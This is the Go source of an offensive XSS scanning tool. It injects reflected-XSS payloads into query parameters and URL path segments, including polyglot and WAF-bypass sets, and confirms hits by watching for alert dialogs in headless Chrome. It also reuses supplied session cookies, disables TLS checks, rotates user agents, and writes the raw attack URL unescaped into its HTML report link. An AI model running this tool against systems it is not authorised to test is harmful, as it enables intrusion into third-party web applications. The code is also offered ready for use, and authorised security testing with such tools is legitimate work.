package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"html"
	"io"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"path"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/chromedp/cdproto/network"
	"github.com/chromedp/cdproto/page"
	"github.com/chromedp/chromedp"
)

// --- GRANDMASTER SYSTEM CONFIGURATION ---
const (
	DefaultStaticWorkers = 200
	MaxBrowserWorkers    = 40
	StaticTimeout        = 8 * time.Second
	BrowserTimeout       = 25 * time.Second
	BadCharProbe         = "gxss<'\">"
	Version              = "GRANDMASTER V16.1 (PRECISION PATH)" // Updated
)

// --- VISUAL INTERFACE ---
const (
	NeonGreen  = "\033[38;5;82m"
	NeonCyan   = "\033[38;5;51m"
	NeonPink   = "\033[38;5;198m"
	NeonYellow = "\033[38;5;226m"
	NeonRed    = "\033[38;5;196m"
	Reset      = "\033[0m"
	Bold       = "\033[1m"
	Dim        = "\033[2m"
	ClearLine  = "\033[2K\r"
)

// --- DATA STRUCTURES ---

type Finding struct {
	URL       string
	Payload   string
	Injection string
	Param     string
	Context   string
}

type Stats struct {
	Processed uint64
	Reflected uint64
	Validated uint64
	Errors    uint64
	Skipped   uint64
}

type ParamKey struct {
	Host  string
	Path  string
	Param string
}

// Global Variables
var (
	globalStats      Stats
	debugMode        bool
	forceMode        bool
	scanPathMode     bool
	cachedPayloads   map[PayloadContext][]string
	urlParamsCache   []string
	vulnerableParams sync.Map
	globalCookies    []*http.Cookie
	wafCache         sync.Map
)

var userAgents = []string{
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
}

func getRandomUA() string {
	return userAgents[rand.Intn(len(userAgents))]
}

func initPayloadCache() {
	cachedPayloads = make(map[PayloadContext][]string)
	contexts := []PayloadContext{
		HTML_CONTEXT, ATTRIBUTE_CONTEXT, JAVASCRIPT_CONTEXT,
		URL_CONTEXT, JSON_CONTEXT, TAG_CONTEXT,
		EVENT_HANDLER_CONTEXT, POLYGLOT_CONTEXT,
		WAF_BYPASS_CONTEXT, JSONP_CONTEXT,
	}

	for _, ctx := range contexts {
		cachedPayloads[ctx] = GetPayloadsByContext(ctx)
	}

	urlParamsCache = []string{
		"javascript:alert(1)",
		"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
	}
	urlParamsCache = append(urlParamsCache, cachedPayloads[JAVASCRIPT_CONTEXT]...)
}

// --- INTELLIGENT COOKIE PARSER ---
func parseCookies(raw string) {
	if raw == "" {
		return
	}
	raw = strings.ReplaceAll(raw, "\n", "")
	raw = strings.ReplaceAll(raw, "\r", "")
	raw = strings.Trim(raw, "\"")

	parts := strings.Split(raw, ";")

	for _, part := range parts {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}
		name, value, found := strings.Cut(part, "=")
		if found {
			globalCookies = append(globalCookies, &http.Cookie{
				Name:  name,
				Value: value,
			})
		}
	}

	if len(globalCookies) > 0 {
		fmt.Printf("%s[*] Authentication: %d Cookies loaded into Grandmaster Engine%s\n", NeonGreen, len(globalCookies), Reset)
	}
}

// --- MAIN ENTRY POINT ---
func main() {
	log.SetOutput(io.Discard)
	rand.Seed(time.Now().UnixNano())

	targetURL := flag.String("u", "", "Target URL")
	listPath := flag.String("l", "", "Path to URLs list file")
	payloadPath := flag.String("p", "", "Path to custom XSS payloads (Optional)")
	targetParam := flag.String("param", "", "Focus scan on a specific parameter")
	cookieRaw := flag.String("cookie", "", "Custom Cookies string")
	cookieFile := flag.String("cookie-file", "", "Path to file containing cookies")
	outputFile := flag.String("o", "gxss_report.html", "Report output filename")
	concurrency := flag.Int("c", DefaultStaticWorkers, "Concurrency level")
	debug := flag.Bool("debug", false, "Enable verbose debug output")
	force := flag.Bool("force", false, "Force fuzzing even if probe is not reflected")
	scanPath := flag.Bool("scan-path", true, "Enable Path Segment Injection scanning (Default: true)")
	flag.Parse()

	debugMode = *debug
	forceMode = *force
	scanPathMode = *scanPath

	printBanner()

	if *targetURL == "" && *listPath == "" {
		fmt.Printf("%s[!] Error: Target (-u) atau List (-l) diperlukan.%s\n", NeonRed, Reset)
		return
	}

	initPayloadCache()

	// Cookie Loading Logic
	finalCookieStr := *cookieRaw
	if *cookieFile != "" {
		content, err := os.ReadFile(*cookieFile)
		if err != nil {
			fmt.Printf("%s[!] Error reading cookie file: %v%s\n", NeonRed, err, Reset)
			return
		}
		finalCookieStr = string(content)
	}
	parseCookies(finalCookieStr)

	var customPayloads []string
	useSmartMode := true

	if *payloadPath != "" {
		var err error
		customPayloads, err = readLines(*payloadPath)
		if err != nil {
			fmt.Printf("%s[!] Error reading payload file: %v%s\n", NeonRed, err, Reset)
			return
		}
		if len(customPayloads) > 0 {
			useSmartMode = false
			fmt.Printf("%s[*] Mode: CUSTOM PAYLOAD FILE (%d payloads loaded)%s\n", NeonYellow, len(customPayloads), Reset)
		}
	}

	if useSmartMode {
		total := len(GetAllPayloads())
		fmt.Printf("%s[*] Mode: GRANDMASTER SMART ENGINE (Smart Filter Active: %d internal payloads)%s\n", NeonGreen, total, Reset)
	}

	if scanPathMode {
		fmt.Printf("%s[*] Vectors: QUERY PARAMS + PATH SEGMENTS ENABLED%s\n", NeonPink, Reset)
	}

	var targets []string
	if *targetURL != "" {
		targets = append(targets, *targetURL)
	} else {
		var err error
		targets, err = readLines(*listPath)
		if err != nil {
			fmt.Printf("%s[!] Error reading list file: %v%s\n", NeonRed, err, Reset)
			return
		}
	}

	fmt.Printf("%s[*] Logical Processors Available: %d%s\n", NeonPink, runtime.NumCPU(), Reset)
	fmt.Printf("%s[*] Spawning %d Static Workers & %d Browser Workers...%s\n", NeonPink, *concurrency, MaxBrowserWorkers, Reset)

	startScan(targets, customPayloads, useSmartMode, *concurrency, *outputFile, *targetParam)
}

// --- SCANNING ENGINE ---

func startScan(targets []string, customPayloads []string, smartMode bool, threads int, report string, targetParam string) {
	fmt.Printf("%s[*] Initializing Protocol Mutation Engine (URL Specialized)...%s\n", NeonCyan, Reset)

	startTime := time.Now()
	results := make([]Finding, 0)
	var mu sync.Mutex

	// [UPDATE] Context for Stop-on-Vuln
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	browserChan := make(chan Finding, 10000)
	staticJobChan := make(chan struct{}, threads)

	var wgStatic sync.WaitGroup
	var wgBrowser sync.WaitGroup

	// --- 1. SETUP BROWSER WORKER POOL ---
	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("headless", true),
		chromedp.Flag("disable-gpu", true),
		chromedp.Flag("no-sandbox", true),
		chromedp.Flag("disable-dev-shm-usage", true),
		chromedp.Flag("ignore-certificate-errors", true),
		chromedp.Flag("user-agent", getRandomUA()),
		chromedp.Flag("blink-settings", "imagesEnabled=false"),
		chromedp.Flag("disable-extensions", true),
		chromedp.Flag("mute-audio", true),
	)
	allocCtx, cancelAlloc := chromedp.NewExecAllocator(context.Background(), opts...)
	defer cancelAlloc()

	for i := 0; i < MaxBrowserWorkers; i++ {
		wgBrowser.Add(1)
		go func() {
			defer wgBrowser.Done()
			for {
				select {
				case <-ctx.Done():
					return // Stop worker if context cancelled
				case f, ok := <-browserChan:
					if !ok {
						return
					}

					// Skip if param already vulnerable (unless it's PATH injection, which varies by payload)
					if f.Param != "PATH" {
						// Logic ini agak berlebihan karena kita stop-on-vuln, tapi tetap disimpan untuk robustness
						if _, hit := vulnerableParams.Load(ParamKey{Host: "SKIP", Path: "SKIP", Param: "SKIP"}); hit {
							continue
						}
					}

					isVuln := false
					vulnContext := f.Context

					if verifyDynamic(allocCtx, f.URL) {
						isVuln = true
					} else {
						domRes, err := AnalyzeDOM(allocCtx, f.URL)
						if err == nil && domRes.IsVulnerable {
							isVuln = true
							vulnContext = fmt.Sprintf("DOM SINK (%s)", domRes.Sink)
						}
					}

					if isVuln {
						// Double check context before reporting to prevent race conditions on printing multiple
						if ctx.Err() != nil {
							return
						}

						// Mark param as vulnerable
						pKey := ParamKey{Host: "PATH_INJECT", Path: f.URL, Param: "PATH"}
						if f.Param != "PATH" {
							uParsed, _ := url.Parse(f.URL)
							pKey = ParamKey{Host: uParsed.Host, Path: uParsed.Path, Param: f.Param}
							vulnerableParams.Store(pKey, true)
						}

						atomic.AddUint64(&globalStats.Validated, 1)

						fmt.Printf("%s%s[!] XSS VALIDATED! %s[%s] %s| %-10s %s| %s%s%s\n",
							ClearLine, NeonGreen, Reset, vulnContext, NeonYellow, f.Param, Reset, NeonCyan, f.URL, Reset)
						fmt.Printf("%s    PAYLOAD: %s%s\n", NeonYellow, f.Injection, Reset)

						mu.Lock()
						f.Context = vulnContext
						results = append(results, f)
						mu.Unlock()

						// [UPDATE] STOP ON FIRST VULN
						fmt.Printf("\n%s[+] Critical Vulnerability Found. Stopping Scan as requested.%s\n", NeonGreen, Reset)
						cancel() // Stop all workers
						return
					}
				}
			}
		}()
	}

	// --- 2. SETUP STATIC WORKER CLIENT ---
	t := &http.Transport{
		Proxy: http.ProxyFromEnvironment,
		DialContext: (&net.Dialer{
			Timeout:   5 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		ForceAttemptHTTP2:   true,
		MaxIdleConns:        2000,
		MaxIdleConnsPerHost: 1000,
		IdleConnTimeout:     90 * time.Second,
		TLSHandshakeTimeout: 5 * time.Second,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true, Renegotiation: tls.RenegotiateOnceAsClient},
	}

	client := &http.Client{
		Timeout:   StaticTimeout,
		Transport: t,
	}

	// --- 3. MAIN ATTACK LOOP ---
	for _, t := range targets {
		if ctx.Err() != nil {
			break
		}

		u, err := url.Parse(t)
		if err != nil {
			continue
		}

		// WAF Check
		host := u.Hostname()
		if _, seen := wafCache.Load(host); !seen {
			wafName := DetectWAF(t, client)
			wafCache.Store(host, wafName)
			if wafName != "" {
				fmt.Printf("%s%s[!] WAF DETECTED: %s%s (%s)%s\n", ClearLine, NeonRed, Bold, wafName, host, Reset)
			}
		}

		// === VECTOR 1: QUERY PARAMETERS ===
		if len(u.Query()) > 0 || targetParam != "" {
			processQueryParams(ctx, u, client, customPayloads, smartMode, targetParam, &wgStatic, staticJobChan, browserChan)
		}

		// === VECTOR 2: PATH SEGMENT INJECTION (V16.1 PRECISION UPDATE) ===
		if scanPathMode {
			processPathInjection(ctx, u, client, customPayloads, smartMode, &wgStatic, staticJobChan, browserChan)
		}
	}

	// --- 4. PROGRESS ---
	stopProgress := make(chan bool)
	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				updateProgress()
			case <-stopProgress:
				return
			case <-ctx.Done():
				return
			}
		}
	}()

	// Helper wait routine that respects context cancellation for quicker exit
	waitCh := make(chan struct{})
	go func() {
		wgStatic.Wait()
		close(browserChan)
		wgBrowser.Wait()
		close(waitCh)
	}()

	select {
	case <-waitCh:
		// Normal finish
	case <-ctx.Done():
		// Cancellation triggered (Vuln found), wait briefly for browser workers to cleanup
		// Ideally we just wait for browser workers to return since we called cancel()
		<-waitCh
	}

	stopProgress <- true
	updateProgress()

	duration := time.Since(startTime)
	generateReport(results, report, duration)

	fmt.Printf("\n\n%s%s[+] Scan Complete in %v%s\n", ClearLine, NeonGreen, duration, Reset)
	fmt.Printf("%s[+] Findings Saved to: %s%s\n", NeonCyan, report, Reset)
}

// --- V16.1 PRECISION PATH INJECTOR ---
func processPathInjection(ctx context.Context, baseObj *url.URL, client *http.Client, customPayloads []string, smartMode bool, wg *sync.WaitGroup, jobChan chan struct{}, browserChan chan Finding) {
	var payloadsToRun []struct {
		Content string
		CtxName string
	}

	// Filter payloads: Only use POLYGLOT + TOP HTML for Path Injection to be efficient
	if smartMode {
		if polys, ok := cachedPayloads[POLYGLOT_CONTEXT]; ok {
			for _, p := range polys {
				payloadsToRun = append(payloadsToRun, struct{Content, CtxName string}{p, "PATH-POLY"})
			}
		}
		if htmls, ok := cachedPayloads[HTML_CONTEXT]; ok {
			// Taking Top 15 HTML Payloads
			limit := 15
			if len(htmls) < limit {
				limit = len(htmls)
			}
			for i := 0; i < limit; i++ {
				payloadsToRun = append(payloadsToRun, struct{Content, CtxName string}{htmls[i], "PATH-HTML"})
			}
		}
	} else {
		for _, p := range customPayloads {
			payloadsToRun = append(payloadsToRun, struct{Content, CtxName string}{p, "CUSTOM-PATH"})
		}
	}

	originalPath := baseObj.Path
	if originalPath == "" || originalPath == "/" {
		originalPath = ""
	} else {
		// Clean trailing slash for base
		originalPath = strings.TrimSuffix(originalPath, "/")
	}

	// === STRATEGY GENERATOR ===
	type InjectionStrategy int
	const (
		DIRECT_APPEND InjectionStrategy = iota // /path<payload>
		SLASH_APPEND                           // /path/<payload>
		REPLACE_LAST                           // /parent/<payload>
	)

	for _, item := range payloadsToRun {
		// Check context before loop iteration
		if ctx.Err() != nil {
			return
		}

		strategies := []InjectionStrategy{DIRECT_APPEND, SLASH_APPEND}
		if strings.Contains(originalPath, "/") {
			strategies = append(strategies, REPLACE_LAST)
		}

		for _, strategy := range strategies {
			// [UPDATE] Check Context
			select {
			case <-ctx.Done():
				return
			default:
			}

			wg.Add(1)
			select {
			case jobChan <- struct{}{}:
			case <-ctx.Done():
				wg.Done()
				return
			}

			go func(pl string, ctxName string, strat InjectionStrategy) {
				defer wg.Done()
				defer func() { <-jobChan }()

				// Quick exit in goroutine if context dead
				if ctx.Err() != nil {
					return
				}

				var injectedPath string

				switch strat {
				case DIRECT_APPEND:
					injectedPath = originalPath + pl
				case SLASH_APPEND:
					injectedPath = originalPath + "/" + pl
				case REPLACE_LAST:
					parent := path.Dir(originalPath)
					if parent == "." || parent == "/" {
						parent = ""
					}
					injectedPath = parent + "/" + pl
				}

				uCopy := *baseObj
				scheme := uCopy.Scheme
				host := uCopy.Host
				query := uCopy.RawQuery

				var fullAttackURL string
				if query != "" {
					fullAttackURL = fmt.Sprintf("%s://%s%s?%s", scheme, host, injectedPath, query)
				} else {
					fullAttackURL = fmt.Sprintf("%s://%s%s", scheme, host, injectedPath)
				}

				// Pass ctx to checkReflection
				if checkReflection(ctx, client, fullAttackURL, pl) {
					stratName := "PATH"
					if strat == DIRECT_APPEND {
						stratName = "PATH-APPEND"
					}
					if strat == REPLACE_LAST {
						stratName = "PATH-REPLACE"
					}

					browserChan <- Finding{
						URL:       fullAttackURL,
						Payload:   pl,
						Injection: pl,
						Param:     stratName,
						Context:   ctxName,
					}
				}
				atomic.AddUint64(&globalStats.Processed, 1)

			}(item.Content, item.CtxName, strategy)
		}
	}
}

// --- QUERY PARAM PROCESSOR ---
func processQueryParams(ctx context.Context, u *url.URL, client *http.Client, customPayloads []string, smartMode bool, targetParam string, wg *sync.WaitGroup, jobChan chan struct{}, browserChan chan Finding) {
	originalQuery := u.Query()
	t := u.String()

	if targetParam != "" {
		if _, exists := originalQuery[targetParam]; !exists {
			originalQuery[targetParam] = []string{""}
		}
	}

	for param, values := range originalQuery {
		if ctx.Err() != nil {
			return
		}

		if targetParam != "" && param != targetParam {
			continue
		}

		originalValue := ""
		if len(values) > 0 {
			originalValue = values[0]
		}

		smartProbe := getContextualProbe(param)
		isUrlParam := smartProbe != "gxss" && smartProbe != "1234gxss"

		// Pass ctx to probe if needed, but for now we keep probe simple as it uses client
		// Ideally client requests should use ctx too
		isReflected, detectedContext, useAppend := checkChameleonProbe(client, t, param, originalValue, smartProbe)

		if !isReflected && originalValue == "" {
			if forceMode {
				if isUrlParam {
					detectedContext = URL_CONTEXT
				} else {
					detectedContext = POLYGLOT_CONTEXT
				}
				useAppend = false
			} else {
				continue
			}
		} else if !isReflected {
			useAppend = true
			detectedContext = POLYGLOT_CONTEXT
		}

		atomic.AddUint64(&globalStats.Reflected, 1)

		var payloadsToRun []struct {
			Content string
			CtxName string
		}

		if smartMode {
			if polys, ok := cachedPayloads[POLYGLOT_CONTEXT]; ok {
				for _, p := range polys {
					payloadsToRun = append(payloadsToRun, struct{Content, CtxName string}{p, "POLY"})
				}
			}
			if detectedContext != POLYGLOT_CONTEXT {
				if payloads, ok := cachedPayloads[detectedContext]; ok {
					for _, p := range payloads {
						payloadsToRun = append(payloadsToRun, struct{Content, CtxName string}{p, contextToString(detectedContext)})
					}
				}
			}
		} else {
			for _, p := range customPayloads {
				payloadsToRun = append(payloadsToRun, struct{Content, CtxName string}{p, "CUSTOM"})
			}
		}

		for _, item := range payloadsToRun {
			// [UPDATE] Check Context
			select {
			case <-ctx.Done():
				return
			default:
			}

			wg.Add(1)
			select {
			case jobChan <- struct{}{}:
			case <-ctx.Done():
				wg.Done()
				return
			}

			go func(pl string, ctxName string, targetUrl url.URL, pName string, pOrig string, appendMode bool) {
				defer wg.Done()
				defer func() { <-jobChan }()

				if ctx.Err() != nil {
					return
				}

				pKey := ParamKey{Host: targetUrl.Host, Path: targetUrl.Path, Param: pName}
				if _, hit := vulnerableParams.Load(pKey); hit {
					atomic.AddUint64(&globalStats.Skipped, 1)
					return
				}

				qs := targetUrl.Query()
				finalPayload := pl
				if appendMode {
					finalPayload = pOrig + pl
				}

				qs.Set(pName, finalPayload)
				targetUrl.RawQuery = qs.Encode()
				attackURL := targetUrl.String()

				// Pass ctx
				if checkReflection(ctx, client, attackURL, pl) {
					browserChan <- Finding{
						URL:       attackURL,
						Payload:   finalPayload,
						Injection: pl,
						Param:     pName,
						Context:   ctxName,
					}
				}
				atomic.AddUint64(&globalStats.Processed, 1)
			}(item.Content, item.CtxName, *u, param, originalValue, useAppend)
		}
	}
}

// ... [Helper Functions: verifyDynamic, checkReflection, etc. - KEPT SAME BUT SECURED] ...

func verifyDynamic(allocCtx context.Context, target string) bool {
	ctx, cancel := chromedp.NewContext(allocCtx)
	defer cancel()

	ctx, cancel = context.WithTimeout(ctx, BrowserTimeout)
	defer cancel()

	u, err := url.Parse(target)
	var tasks chromedp.Tasks

	if err == nil && len(globalCookies) > 0 {
		tasks = append(tasks, network.Enable())
		for _, cookie := range globalCookies {
			tasks = append(tasks, network.SetCookie(cookie.Name, cookie.Value).
				WithDomain(u.Hostname()).
				WithPath("/"))
		}
	}

	tasks = append(tasks,
		network.Enable(),
		chromedp.Navigate(target),
	)

	triggered := make(chan bool, 1)

	chromedp.ListenTarget(ctx, func(ev interface{}) {
		if _, ok := ev.(*page.EventJavascriptDialogOpening); ok {
			select {
			case triggered <- true:
			default:
			}
			go func() {
				chromedp.Run(ctx, page.HandleJavaScriptDialog(true))
				cancel()
			}()
		}
	})

	err = chromedp.Run(ctx, tasks)

	if err != nil && err == context.Canceled {
		select {
		case <-triggered:
			return true
		default:
			return false
		}
	}

	select {
	case <-triggered:
		return true
	case <-time.After(100 * time.Millisecond):
		return false
	}
}

// [UPDATE] Accept context to cancel in-flight requests
func checkReflection(ctx context.Context, c *http.Client, target string, payload string) bool {
	req, err := http.NewRequestWithContext(ctx, "GET", target, nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", getRandomUA())

	for _, cookie := range globalCookies {
		req.AddCookie(cookie)
	}
	req.Close = true

	resp, err := c.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 512*1024))
	body := string(bodyBytes)

	checkStr := payload
	if len(payload) > 20 {
		checkStr = payload[:20]
	}
	return strings.Contains(body, checkStr)
}

func updateProgress() {
	p := atomic.LoadUint64(&globalStats.Processed)
	r := atomic.LoadUint64(&globalStats.Reflected)
	v := atomic.LoadUint64(&globalStats.Validated)
	s := atomic.LoadUint64(&globalStats.Skipped)

	fmt.Printf("\r%s%s[PROCESSED: %s%d%s] [REFLECTED: %s%d%s] [SKIPPED: %s%d%s] [VULN: %s%d%s]%s",
		ClearLine, Bold,
		NeonCyan, p, Reset,
		NeonYellow, r, Reset,
		NeonPink, s, Reset,
		NeonGreen, v, Reset,
		Reset)
}

func getContextualProbe(param string) string {
	param = strings.ToLower(param)
	if strings.Contains(param, "url") || strings.Contains(param, "uri") ||
		strings.Contains(param, "redir") || strings.Contains(param, "src") ||
		strings.Contains(param, "href") || strings.Contains(param, "link") ||
		strings.Contains(param, "goto") {
		return "http://gxss.com"
	}
	if strings.Contains(param, "mail") || strings.Contains(param, "user") {
		return "gxss@test.com"
	}
	if strings.Contains(param, "id") || strings.Contains(param, "num") ||
		strings.Contains(param, "page") || strings.Contains(param, "offset") {
		return "1234gxss"
	}
	return "gxss"
}

func checkChameleonProbe(c *http.Client, base string, param string, origVal string, smartProbe string) (bool, PayloadContext, bool) {
	u, _ := url.Parse(base)
	qs := u.Query()

	qs.Set(param, smartProbe)
	u.RawQuery = qs.Encode()
	if ok, ctx := fireSimpleProbe(c, u.String(), "gxss"); ok {
		return true, ctx, false
	}

	if origVal != "" {
		qs.Set(param, origVal+smartProbe)
		u.RawQuery = qs.Encode()
		if ok, ctx := fireSimpleProbe(c, u.String(), "gxss"); ok {
			return true, ctx, true
		}
	}

	qs.Set(param, BadCharProbe)
	u.RawQuery = qs.Encode()
	if ok, ctx := fireSimpleProbe(c, u.String(), "gxss"); ok {
		return true, ctx, false
	}

	return false, 0, false
}

func fireSimpleProbe(c *http.Client, target string, keyword string) (bool, PayloadContext) {
	req, _ := http.NewRequest("GET", target, nil)
	req.Header.Set("User-Agent", getRandomUA())

	for _, cookie := range globalCookies {
		req.AddCookie(cookie)
	}

	req.Close = true

	resp, err := c.Do(req)
	if err != nil {
		return false, 0
	}
	defer resp.Body.Close()

	bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 1024*1024))
	body := string(bodyBytes)

	if strings.Contains(body, keyword) {
		if strings.Contains(body, keyword+"<") || strings.Contains(body, ">"+keyword) {
			return true, HTML_CONTEXT
		}
		if strings.Contains(body, keyword+"\"") || strings.Contains(body, "\""+keyword) {
			return true, ATTRIBUTE_CONTEXT
		}
		if strings.Contains(body, keyword+"'") || strings.Contains(body, "'"+keyword) {
			return true, ATTRIBUTE_CONTEXT
		}
		return true, POLYGLOT_CONTEXT
	}
	return false, 0
}

func contextToString(ctx PayloadContext) string {
	switch ctx {
	case HTML_CONTEXT:
		return "HTML"
	case ATTRIBUTE_CONTEXT:
		return "ATTR"
	case JAVASCRIPT_CONTEXT:
		return "JS"
	case URL_CONTEXT:
		return "URL"
	case POLYGLOT_CONTEXT:
		return "POLY"
	case WAF_BYPASS_CONTEXT:
		return "WAF"
	case JSONP_CONTEXT:
		return "JSONP"
	default:
		return "UNK"
	}
}

func readLines(path string) ([]string, error) {
	if path == "" {
		return nil, nil
	}
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		text := strings.TrimSpace(scanner.Text())
		if text != "" {
			lines = append(lines, text)
		}
	}
	return lines, scanner.Err()
}

func printBanner() {
	fmt.Println(NeonCyan + `
 ██████╗ ██╗  ██╗███████╗███████╗     ██████╗ ██████╗ ██╗███╗   ███╗███████╗
██╔════╝ ██║  ██║██╔════╝██╔════╝     ██╔══██╗██╔══██╗██║████╗ ████║██╔════╝
██║  ███╗╚██╗██╔╝███████╗███████╗     ██████╔╝██████╔╝██║██╔████╔██║█████╗  
██║   ██║ ╚███╔╝ ╚════██║╚════██║     ██╔═══╝ ██╔══██╗██║██║╚██╔╝██║██╔══╝  
╚██████╔╝ ██╔██╗ ███████║███████║     ██║     ██║  ██║██║██║ ╚═╝ ██║███████╗
 ╚═════╝  ╚═╝╚═╝ ╚══════╝╚══════╝     ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚══════╝` + Dim + `
       [ STATUS: ` + Version + ` ] [ ARCHITECT: REI ]` + Reset + "\n")
}

func generateReport(findings []Finding, filename string, duration time.Duration) {
	f, _ := os.Create(filename)
	defer f.Close()

	htmlTemplate := `
	<!DOCTYPE html>
	<html>
	<head>
		<meta charset="UTF-8">
		<title>GXSS Grandmaster Report</title>
		<style>
			body { background: #050505; color: #00ff41; font-family: 'Consolas', monospace; padding: 40px; line-height: 1.6; }
			h1 { color: #00ffff; border-bottom: 2px solid #00ffff; padding-bottom: 10px; text-transform: uppercase; letter-spacing: 2px; }
			.container { max-width: 1200px; margin: auto; }
			.card { border: 1px solid #333; padding: 20px; margin: 15px 0; background: #0a0a0a; border-radius: 8px; border-left: 5px solid #00ff41; transition: 0.3s; position: relative; overflow: hidden; }
			.card:hover { border-color: #00ffff; box-shadow: 0 0 15px rgba(0, 255, 255, 0.2); }
			.stat { color: #00ffff; font-size: 1.1em; margin-bottom: 20px; background: #111; padding: 10px; border-radius: 4px; display: inline-block; }
			.url { color: #ff00ff; word-break: break-all; margin: 10px 0; display: block; font-size: 0.9em; }
			.payload { color: #fff; background: #222; padding: 5px; border-radius: 4px; display: inline-block; margin-top: 5px; font-size: 0.8em; }
			.repro-btn { display: inline-block; margin-top: 15px; padding: 10px 20px; background: transparent; color: #00ff41; border: 1px solid #00ff41; text-decoration: none; font-weight: bold; border-radius: 4px; text-transform: uppercase; font-size: 0.8em; transition: all 0.3s; }
			.repro-btn:hover { background: #00ff41; color: #000; box-shadow: 0 0 10px #00ff41; cursor: pointer; }
			.tag { background: #00ff41; color: #000; padding: 2px 8px; border-radius: 3px; font-weight: bold; margin-right: 10px; }
			.ctx { background: #ff00ff; color: #fff; padding: 2px 8px; border-radius: 3px; font-weight: bold; margin-right: 10px; font-size: 0.8em; }
		</style>
	</head>
	<body>
		<div class="container">
			<h1>GXSS GRANDMASTER - SYSTEM ARCHITECT REPORT</h1>
			<div class="stat">DURATION: %v | TOTAL FINDINGS: %d</div>
			%s
		</div>
	</body>
	</html>`

	cards := ""
	for _, res := range findings {
		cards += fmt.Sprintf(`
		<div class="card">
			<div><span class="tag">VERIFIED</span><span class="ctx">%s</span><b>PARAMETER:</b> %s</div>
			<code class="url">%s</code>
			<div style="color: #888; font-size: 0.85em; margin-top:10px;"><b>RAW PAYLOAD (DB):</b> <span class="payload">%s</span></div>
			<div style="color: #888; font-size: 0.85em; margin-top:5px;"><b>FULL VALUE:</b> <span style="color:#aaa">%s</span></div>
			<a href="%s" target="_blank" class="repro-btn">Reproduce POC</a>
		</div>`, res.Context, res.Param, html.EscapeString(res.URL), html.EscapeString(res.Injection), html.EscapeString(res.Payload), res.URL)
	}
	f.WriteString(fmt.Sprintf(htmlTemplate, duration, len(findings), cards))
}
